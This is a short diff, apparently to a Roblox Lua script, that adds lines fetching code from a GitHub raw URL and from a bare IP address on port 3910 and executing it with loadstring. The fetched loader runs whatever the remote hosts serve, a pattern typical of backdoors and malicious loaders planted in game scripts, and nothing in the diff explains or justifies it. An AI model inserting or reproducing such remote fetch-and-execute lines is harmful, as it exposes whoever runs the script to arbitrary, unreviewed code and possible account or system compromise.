@@ -1,0 +1,4 @@
+ID="df292e5b-ba15-4411-ac8f-9b86049fb001";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/LuaCom/refs/heads/main/r4mpage.gay"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
